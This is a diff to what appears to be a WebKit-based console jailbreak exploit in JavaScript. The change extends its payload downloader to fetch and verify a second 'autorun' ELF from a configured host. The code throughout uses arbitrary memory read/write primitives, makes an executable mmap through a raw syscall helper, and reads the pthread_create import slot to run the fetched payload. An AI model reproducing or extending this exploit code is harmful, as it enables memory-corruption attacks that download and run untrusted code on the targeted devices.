@@ -2323,7 +2323,9 @@ let allDone = false;
                                         ip: String(tj.ip || ""),
                                         port: (tj.port | 0) || 80,
                                         path: "/jb/host/pkg/ludora.pkg",
-                                        sha256: String(tj.sha256 || "")
+                                        sha256: String(tj.sha256 || ""),
+                                        path2: "/jb/host/autorun/ludora_autorun.elf",
+                                        sha2562: String(tj.autorun_sha256 || "")
                                     };
                                 }
                             } catch (e) { /* no site -> test fallback */ }
@@ -2344,8 +2346,8 @@ let allDone = false;
                                         && dl[2] === 0x4c && dl[3] === 0x46) {
                                         mark("DOWNLOADER-PAYLOAD", "ELF-rejected");
                                     } else {
-                                        // mmap 必须覆盖到参数区末尾(0x5000 + 0x28c),取整页。
-                                        const dsz = (DL_PARAMS_OFF + 0x28c + 0xfff) & ~0xfff;
+                                        // mmap 必须覆盖到参数区末尾(0x5000 + 0x4cc),取整页。
+                                        const dsz = (DL_PARAMS_OFF + 0x4cc + 0xfff) & ~0xfff;
                                         const dm = sc(SYS.mmap, 0, dsz, 7, 0x1002, -1, 0);
                                         const dentry = new int64(dm.lo, dm.hi);
                                         if (dentry.hi > 0) {
@@ -2363,12 +2365,14 @@ let allDone = false;
                                                 const ip = String(dlp.ip || "");
                                                 const path = String(dlp.path || "");
                                                 const sha = String(dlp.sha256 || "");
+                                                const path2 = String(dlp.path2 || "");
+                                                const sha2 = String(dlp.sha2562 || "");
                                                 const port = (dlp.port | 0) & 0xffff;
                                                 p.write4(dentry.add32(DL_PARAMS_OFF + 0x00), DL_PARAMS_MAGIC);
                                                 p.write4(dentry.add32(DL_PARAMS_OFF + 0x04),
                                                     port | ((ip.length & 0xffff) << 16));
                                                 p.write4(dentry.add32(DL_PARAMS_OFF + 0x08),
-                                                    path.length & 0xffff);
+                                                    (path.length & 0xffff) | ((path2.length & 0xffff) << 16));
                                                 let k;
                                                 for (k = 0; k < ip.length; ++k)
                                                     p.write1(dentry.add32(DL_PARAMS_OFF + 0x0c + k),
@@ -2379,6 +2383,12 @@ let allDone = false;
                                                 for (k = 0; k < 64 && k < sha.length; ++k)
                                                     p.write1(dentry.add32(DL_PARAMS_OFF + 0x24c + k),
                                                         sha.charCodeAt(k) & 0xff);
+                                                for (k = 0; k < path2.length; ++k)
+                                                    p.write1(dentry.add32(DL_PARAMS_OFF + 0x28c + k),
+                                                        path2.charCodeAt(k) & 0xff);
+                                                for (k = 0; k < 64 && k < sha2.length; ++k)
+                                                    p.write1(dentry.add32(DL_PARAMS_OFF + 0x48c + k),
+                                                        sha2.charCodeAt(k) & 0xff);
 
                                                 const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                                 const fn = p.read8(slot);
